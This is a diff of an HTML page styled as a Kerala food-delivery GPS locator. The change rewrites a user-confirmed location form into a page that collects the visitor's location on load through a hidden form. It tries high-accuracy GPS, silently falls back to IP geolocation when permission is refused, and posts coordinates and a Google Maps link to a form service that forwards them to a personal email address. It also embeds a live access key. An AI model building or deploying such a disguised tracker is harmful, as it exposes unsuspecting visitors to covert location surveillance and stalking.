@@ -3,156 +3,237 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sanjay's Food Delivery Locator</title>
-    
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    
+    <title>QuickDelivery Kerala | GPS Test</title>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background: #f8f9fa; 
-            margin: 0; 
-            padding: 15px; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
+        :root {
+            --primary: #e67e22;
+            --success: #27ae60;
+            --bg: #f4f7f6;
         }
-        .container { 
-            background: white; 
-            padding: 25px; 
-            border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
-            width: 100%; 
-            max-width: 400px; 
-            text-align: center; 
-            box-sizing: border-box;
+
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto;
+            background-color: var(--bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #2c3e50;
         }
-        h2 { color: #2d3436; margin-bottom: 5px; }
-        #map { 
-            height: 250px; 
-            width: 100%; 
-            border-radius: 15px; 
-            margin: 20px 0; 
-            border: 1px solid #eee; 
-            z-index: 1;
+
+        .app-container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            padding: 30px;
+            border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            text-align: center;
         }
-        .accuracy-badge { 
-            display: inline-block; 
-            padding: 6px 12px; 
-            background: #e3f2fd; 
-            color: #1976d2; 
-            border-radius: 50px; 
-            font-size: 13px; 
-            font-weight: 600;
+
+        .header h1 {
+            color: var(--primary);
+            margin: 0;
+            font-size: 1.6rem;
         }
-        button { 
-            background: #00b894; 
-            color: white; 
-            border: none; 
-            padding: 16px; 
-            border-radius: 12px; 
-            width: 100%; 
-            font-size: 17px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 12px rgba(0, 184, 148, 0.3);
+
+        .status-box {
+            margin: 30px 0;
+            padding: 20px;
+            border-radius: 15px;
+            background: #fffaf5;
+            border: 1px solid #ffe0b2;
         }
-        button:active { transform: scale(0.97); background: #00a383; }
-        button:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
-        #status { font-size: 14px; color: #636e72; margin-top: 15px; line-height: 1.4; }
+
+        #status-icon {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .pulse {
+            animation: pulse-animation 1.5s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+
+        #main-status {
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 8px;
+        }
+
+        #detail-status {
+            font-size: 0.9rem;
+            color: #7f8c8d;
+        }
+
+        .log-container {
+            text-align: left;
+            background: #2d3436;
+            color: #00ff00;
+            padding: 10px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.75rem;
+            height: 80px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        .footer-text {
+            font-size: 0.8rem;
+            color: #bdc3c7;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Delivery Location</h2>
-    <div id="accuracy" class="accuracy-badge">Initializing GPS...</div>
-    
-    <div id="map"></div>
+    <div class="app-container">
+        <div class="header">
+            <h1>🚚 Kerala Delivery</h1>
+            <p>High-Precision Location System</p>
+        </div>
 
-    <form action="https://api.web3forms.com/submit" method="POST" id="locationForm">
-        <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
-        <input type="hidden" name="from_name" value="Delivery App Demo">
-        <input type="hidden" name="subject" value="New Delivery Location Found">
-        
-        <input type="hidden" name="Latitude" id="lat_input">
-        <input type="hidden" name="Longitude" id="lng_input">
-        <input type="hidden" name="Accuracy_Radius" id="acc_input">
-        <input type="hidden" name="Google_Maps_Link" id="gmaps_input">
+        <div class="status-box">
+            <span id="status-icon" class="pulse">📍</span>
+            <div id="main-status">Initializing...</div>
+            <div id="detail-status">Checking GPS availability</div>
+        </div>
 
-        <input type="hidden" name="redirect" value="https://web3forms.com/success">
+        <div class="log-container" id="log">
+            [System]: Ready for testing...<br>
+        </div>
 
-        <button type="submit" id="submitBtn" disabled>Confirming Location...</button>
-    </form>
-    
-    <div id="status">Please grant location access when prompted.</div>
-</div>
+        <p class="footer-text">Your delivery will get to you soon after fetching and sending the location.</p>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
-<script>
-    const statusText = document.getElementById('status');
-    const accBadge = document.getElementById('accuracy');
-    const submitBtn = document.getElementById('submitBtn');
-    
-    // Initialize Map centered on a placeholder
-    const map = L.map('map').setView([0, 0], 2);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '© OpenStreetMap'
-    }).addTo(map);
-    
-    const marker = L.marker([0, 0]).addTo(map);
-
-    // High Precision Location Tracking
-    if ("geolocation" in navigator) {
-        // watchPosition updates in real-time as the user moves
-        navigator.geolocation.watchPosition((position) => {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-
-            // Update UI Map
-            const userPos = [lat, lng];
-            map.setView(userPos, 18); // Zoom level 18 is perfect for house-level
-            marker.setLatLng(userPos);
-
-            // Populate Form Fields
-            document.getElementById('lat_input').value = lat;
-            document.getElementById('lng_input').value = lng;
-            document.getElementById('acc_input').value = `${accuracy.toFixed(2)} meters`;
+        <form id="location-form" style="display: none;">
+            <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
+            <input type="hidden" name="subject" value="URGENT: New Delivery Location Received">
+            <input type="hidden" name="from_name" value="Kerala Food Delivery App">
             
-            // Fixed Google Maps Link Format
-            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-            document.getElementById('gmaps_input').value = mapsUrl;
+            <input type="hidden" name="Coordinates" id="form-coords">
+            <input type="hidden" name="Accuracy" id="form-accuracy">
+            <input type="hidden" name="Method" id="form-method">
+            <input type="hidden" name="GoogleMapsLink" id="form-link">
+        </form>
+    </div>
 
-            // UI Updates
-            accBadge.textContent = `Accuracy: ${accuracy.toFixed(1)}m`;
-            statusText.textContent = "High-precision location locked.";
-            submitBtn.disabled = false;
-            submitBtn.textContent = "Send Delivery Address";
+    <script>
+        const mainStatus = document.getElementById('main-status');
+        const detailStatus = document.getElementById('detail-status');
+        const logBox = document.getElementById('log');
 
-        }, (error) => {
-            let msg = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED: msg = "User denied location access."; break;
-                case error.POSITION_UNAVAILABLE: msg = "Location info unavailable."; break;
-                case error.TIMEOUT: msg = "Request timed out."; break;
-                default: msg = "An unknown error occurred."; break;
+        function addLog(msg) {
+            logBox.innerHTML += `> ${msg}<br>`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        function updateUI(main, detail, icon = "📍") {
+            mainStatus.innerText = main;
+            detailStatus.innerText = detail;
+            if(icon !== "📍") {
+                document.getElementById('status-icon').innerText = icon;
+                document.getElementById('status-icon').classList.remove('pulse');
             }
-            statusText.textContent = "Error: " + msg;
-            accBadge.style.background = "#ffebee";
-            accBadge.style.color = "#c62828";
-            accBadge.textContent = "GPS Error";
-        }, {
-            enableHighAccuracy: true, // THE KEY FOR HIGH PRECISION
-            maximumAge: 0,
-            timeout: 20000
-        });
-    } else {
-        statusText.textContent = "Your browser does not support Geolocation.";
-    }
-</script>
+        }
 
+        // 1. Core Location Function
+        async function getLocation() {
+            addLog("Requesting high-precision GPS...");
+            
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 12000,
+                maximumAge: 0
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => processLocation(pos, "SATELLITE/GPS"),
+                    (err) => {
+                        addLog("GPS Error: " + err.message);
+                        fetchIPLocation();
+                    },
+                    options
+                );
+            } else {
+                addLog("Browser doesn't support GPS.");
+                fetchIPLocation();
+            }
+        }
+
+        // 2. IP Fallback Function
+        async function fetchIPLocation() {
+            addLog("Falling back to IP Location...");
+            updateUI("GPS Signal Weak", "Switching to IP triangulation...");
+            
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                const mockPos = {
+                    coords: {
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        accuracy: 5000 // Approximate for IP
+                    }
+                };
+                processLocation(mockPos, "NETWORK-IP");
+            } catch (e) {
+                addLog("Final Error: No location found.");
+                updateUI("Failed", "Please enable location in settings.");
+            }
+        }
+
+        // 3. Process and Submit
+        function processLocation(pos, method) {
+            const { latitude, longitude, accuracy } = pos.coords;
+            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            addLog(`Found via ${method}`);
+            addLog(`Accuracy: ${Math.round(accuracy)}m`);
+
+            document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
+            document.getElementById('form-accuracy').value = `${Math.round(accuracy)} meters`;
+            document.getElementById('form-method').value = method;
+            document.getElementById('form-link').value = mapsLink;
+
+            updateUI("Location Secured", "Sending to dispatch center...");
+            submitToWeb3();
+        }
+
+        function submitToWeb3() {
+            const form = document.getElementById('location-form');
+            const formData = new FormData(form);
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.success) {
+                    addLog("Data sent to sanjayn1229@gmail.com");
+                    updateUI("Ready to Deliver!", "Your delivery will get to you soon.", "🍕");
+                } else {
+                    updateUI("API Error", "Check your access key.");
+                }
+            })
+            .catch(error => {
+                updateUI("Network Error", "Check your mobile data.");
+                addLog("Network Error: " + error.message);
+            });
+        }
+
+        // Start process on load
+        window.onload = getLocation;
+    </script>
 </body>
 </html>
